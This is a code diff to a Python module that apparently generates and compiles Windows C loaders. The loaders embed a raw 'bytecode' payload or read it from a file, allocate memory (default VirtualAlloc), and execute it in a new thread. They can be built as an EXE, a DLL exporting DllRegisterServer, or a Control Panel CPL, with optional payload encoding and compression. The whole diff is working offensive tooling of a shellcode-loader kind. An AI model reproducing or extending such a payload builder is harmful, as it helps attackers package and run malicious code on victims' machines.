@@ -26,16 +26,25 @@ def _build_compiler_command(options, temp_c_filename, temp_def_filename, output_
 
 def encode(input_filepath, original_filename, options):
     """
-    Dynamically generates and compiles a C program using a pre-transformed bytecode file.
+    Dynamically generates and compiles a C program, handling different data sources.
     """
     print(f"INFO: Starting Windows C embedder with options: {options}")
     
     temp_files_to_clean = []
     try:
-        with open(input_filepath, "rb") as f:
-            bytecode_to_embed = f.read()
+        data_source_choice = options.get('data_source', 'embedded')
+        template_vars = {
+            'data_source_partial': f"partials/datasource_{data_source_choice}.c.j2"
+        }
 
-        bytecode_array_str = ", ".join([f"0x{byte:02x}" for byte in bytecode_to_embed])
+        if data_source_choice == 'file':
+            file_path = options.get('file_path', '').replace('\\', '\\\\')
+            template_vars['file_path'] = file_path
+            template_vars['bytecode_array'] = ""
+        else: # The payload is embedded...
+            with open(input_filepath, "rb") as f:
+                bytecode_to_embed = f.read()
+            template_vars['bytecode_array'] = ", ".join([f"0x{byte:02x}" for byte in bytecode_to_embed])
 
         template_dir = os.path.join(os.path.dirname(__file__), 'templates')
         env = Environment(loader=FileSystemLoader(template_dir), trim_blocks=True, lstrip_blocks=True)
@@ -44,19 +53,18 @@ def encode(input_filepath, original_filename, options):
         output_format = options.get('output_format', 'exe')
         export_name = 'CPlApplet' if output_format == 'cpl' else options.get('export_name', 'DllRegisterServer')
         
-        encoding_choice = options.get('bytecode_encoding')
-        compression_choice = options.get('bytecode_compression')
+        template_vars.update({
+            'data_source': data_source_choice,
+            'allocation_partial': f"partials/alloc_{options.get('allocation_method', 'virtualalloc')}.c.j2",
+            'execution_partial': f"partials/exec_{options.get('execution_method', 'newthread')}.c.j2",
+            'output_format': output_format,
+            'export_name': export_name,
+            'debug_mode': (options.get('debug_mode') == 'true'),
+            'bytecode_transformation': options.get('bytecode_encoding'),
+            'bytecode_compression': options.get('bytecode_compression')
+        })
 
-        c_source_code = template.render(
-            bytecode_array=bytecode_array_str,
-            allocation_partial=f"partials/alloc_{options.get('allocation_method', 'virtualalloc')}.c.j2",
-            execution_partial=f"partials/exec_{options.get('execution_method', 'newthread')}.c.j2",
-            output_format=output_format,
-            export_name=export_name,
-            debug_mode=(options.get('debug_mode') == 'true'),
-            bytecode_transformation=encoding_choice,
-            bytecode_compression=compression_choice
-        )
+        c_source_code = template.render(**template_vars)
 
         temp_c_filename = f"{uuid.uuid4()}.c"
         temp_c_filepath = os.path.join('/tmp/uploads', temp_c_filename)
